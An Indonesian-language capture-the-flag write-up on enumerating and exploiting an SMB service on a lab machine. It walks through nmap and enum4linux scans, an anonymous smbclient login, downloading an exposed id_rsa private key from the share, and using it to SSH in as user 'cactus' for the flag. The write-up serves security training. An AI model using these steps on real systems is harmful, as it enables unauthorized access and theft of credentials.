# Enumerating SMB
lakukan nmap scanning
```shell
sudo nmap <IP> -sV -sS
```
hasil:
```shell
...
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: POLOSMB; OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```

selanjutnya lakukan enumeration dengan `enum4linux`. dan karena dari soal ditanyakan adalah nama **workgroup** maka kita gunakan tag G (`-G`)
```shell
enum4linux 10.10.142.140 -G
```
hasil
```shell
...
 ===========================( Enumerating Workgroup/Domain on 10.10.142.140 )===========================


[+] Got domain/workgroup name: WORKGROUP
...
...
 ==================================( OS information on 10.10.142.140 )==================================


[E] Can't get OS info with smbclient


[+] Got OS info for 10.10.142.140 from srvinfo: 
	POLOSMB        Wk Sv PrQ Unx NT SNT polosmb server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03
...
...
 =================================( Share Enumeration on 10.10.142.140 )=================================


	Sharename       Type      Comment
	---------       ----      -------
	netlogon        Disk      Network Logon Service
	profiles        Disk      Users profiles
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (polosmb server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            POLOSMB
...
```

# Exploiting SMB
selanjutnya kita dapat exploiting SMB service yang ada. Kita dapat mencoba login dengan username "Anonymous" tanpa provide password apapun.
```shell
smbclient //10.10.142.140/profiles -U Anonymous --password='' -p 139
```
selanjutnya setelah terhubung, kita dapat lakukan `?` untuk mengetahui command apa saja yang dapat kita gunakan, selain itu kita dapat eksplor apa saja yang ada di direktori saat ini.

Pertanyaan pertama adalah, siapa kira-kira pemilik SMB share ini? untuk menjawab hal ini, kita dapat melihat isi konten dari file "Working From Home Information.txt" dengan menggunakan command `more "Working From Home Information.txt`.
isi dari file tersebut dapat menjawab pertanyaan tentang siapa pemilik SMB share ini yaitu `John Cactus` dan service apa yang dikonfigurasi untuk dia agar dapat WFH yaitu `ssh`.

setelah itu, karena kita tahu service yang dikonfigurasi adalah ssh, kita dapat pindah ke folder `.ssh` di SMB dengan `cd .ssh`. file yang paling kita perlukan pastinya adalah `id_rsa`, hal ini karena `id_rsa` merupakan private key, yang mana untuk dapat mengakses ssh dengan user terkait yaitu `John cactus` kita perlu menggunakan private key. nah karena kita memerlukan private key tersebut, kita dapat men-downloadnya dengan menggunakan command `mget` atau `get`, dengan cara `mget id_rsa`
 atau `get id_rsa`. Jika sudah terdownload, maka kita dapat keluar dari SMB dengan command `exit`.

terakhir, kita perlu login ke ssh menggunakan username dan ssh key (id_rsa yang baru didapat). namun disini kita belum tahu pasti apa nama usernamenya, meskipun kita tahu nama usernya adalah `John cactus`. Kita dapat sedikit kembali ke hasil enumerating menggunakan `enum4linux`, pada section
```shell
...
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\cactus (Local User)
...
```
dalam hasil enumerate tersebut, didapat nama user `cactus` yang mana bisa jadi merupakan username dari SMB. kita dapat mencoba untuk login menggunakan username ini ke ssh dengan cara menggunakan tag i (`-i`) untuk provide ssh key, dan tag -p (`-p`) untuk provide port nya (port ssh ada di hasil nmap scanning).
```shell
ssh -i id_rsa cactus@<IP> -p 22
```
ternyata berhasil untuk login ke ssh menggunakan user `cactus`! selanjutnya kita dapat melihat isi dari direktori dengan `ls`, dan hasilnya terdapat file `smb.txt` yang dapat kita lihat isinya dengan `cat smb.txt`, dan hasilnya adalah flag terakhir yang perlu di submit untuk SMB.